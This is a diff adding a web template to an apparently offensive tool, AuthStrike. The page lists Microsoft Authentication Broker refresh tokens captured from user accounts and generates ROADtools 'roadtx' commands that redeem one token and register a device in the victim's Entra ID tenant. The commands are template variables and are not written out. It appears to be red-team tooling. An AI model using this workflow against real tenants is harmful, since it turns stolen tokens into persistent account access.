@@ -1,0 +1,92 @@
+{% extends "base.html" %}
+{% block title %}Device registration · AuthStrike{% endblock %}
+{% block breadcrumb %}Device registration{% endblock %}
+{% block content %}
+<div class="page-heading">
+  <div>
+    <div class="eyebrow">Identity / Device registration</div>
+    <h1>Device registration</h1>
+    <p>Prepare authorized ROADtools <code>roadtx</code> commands using a Microsoft Authentication Broker refresh token captured by AuthStrike.</p>
+  </div>
+</div>
+
+<section class="card">
+  <div class="card-header">
+    <div>
+      <div class="card-title">Select a Microsoft Authentication Broker token</div>
+      <div class="card-subtitle">Only successful operations captured with the Microsoft Authentication Broker are shown.</div>
+    </div>
+    <span class="badge badge-info">{{ broker_tokens|length }} available</span>
+  </div>
+  <div class="card-body">
+    <div class="form-field">
+      <label for="brokerTokenSelector">Operation / broker token</label>
+      <select class="select" id="brokerTokenSelector">
+        <option value="">Select a broker token…</option>
+        {% for item in broker_tokens %}
+        <option value="{{ item.operation_id }}" {% if item.operation_id == selected_operation_id %}selected{% endif %}>#{{ item.operation_id }} · {{ item.username }} · Microsoft Authentication Broker · {{ item.captured_at }}</option>
+        {% endfor %}
+      </select>
+    </div>
+  </div>
+</section>
+
+{% if selected_token %}
+<section class="card" style="margin-top:14px">
+  <div class="card-header">
+    <div>
+      <div class="card-title">ROADtools device registration</div>
+      <div class="card-subtitle">Commands are generated from the selected Broker refresh token. Treat the commands as sensitive credentials.</div>
+    </div>
+    <span class="badge badge-success">BROKER</span>
+  </div>
+  <div class="card-body">
+    <div class="stat-row">
+      <div class="stat-box"><span>Account</span><strong>{{ selected_token.username }}</strong></div>
+      <div class="stat-box"><span>Client</span><strong>Microsoft Authentication Broker</strong></div>
+      <div class="stat-box"><span>Operation</span><strong>#{{ selected_token.operation_id }}</strong></div>
+      <div class="stat-box"><span>FOCI metadata</span><strong>{% if selected_token.foci_detected %}Detected{% else %}Not detected{% endif %}</strong></div>
+    </div>
+
+    <div class="notice warning" style="margin-top:14px">
+      <strong>Credential warning:</strong> the commands below contain a refresh token. Copy them only into your authorized test environment and do not share or commit them.
+    </div>
+
+    <div class="code-panel" style="margin-top:14px">
+      <div class="code-toolbar"><span>1 · Obtain a device-registration access token</span><button type="button" data-copy="#roadtxGetTokens">Copy</button></div>
+      <pre id="roadtxGetTokens" class="secret">{{ selected_token.gettokens_command }}</pre>
+    </div>
+
+    <div class="code-panel" style="margin-top:14px">
+      <div class="code-toolbar"><span>2 · Register the device</span><button type="button" data-copy="#roadtxDevice">Copy</button></div>
+      <pre id="roadtxDevice">{{ selected_token.device_command }}</pre>
+    </div>
+
+    <div class="notice info" style="margin-top:14px">
+      <strong>ROADtools flow:</strong> the first command redeems the Broker refresh token for the <code>devicereg</code> resource and stores the resulting token in ROADtools' default token file. The second command uses that token to register the device.
+      <a href="https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-%28roadtx%29" target="_blank" rel="noopener noreferrer">ROADtools documentation ↗</a>
+    </div>
+  </div>
+</section>
+{% elif broker_tokens %}
+<section class="card" style="margin-top:14px">
+  <div class="card-body"><div class="notice info">Select a Microsoft Authentication Broker token above to generate the ROADtools commands.</div></div>
+</section>
+{% else %}
+<section class="card" style="margin-top:14px">
+  <div class="card-body"><div class="notice info">No active Microsoft Authentication Broker refresh token is currently available.</div></div>
+</section>
+{% endif %}
+{% endblock %}
+{% block scripts %}
+<script>
+(() => {
+  const selector = document.getElementById('brokerTokenSelector');
+  if (!selector) return;
+  selector.addEventListener('change', () => {
+    const value = selector.value;
+    window.location.href = value ? `{{ url_for('device_registration') }}?operation_id=${encodeURIComponent(value)}` : `{{ url_for('device_registration') }}`;
+  });
+})();
+</script>
+{% endblock %}
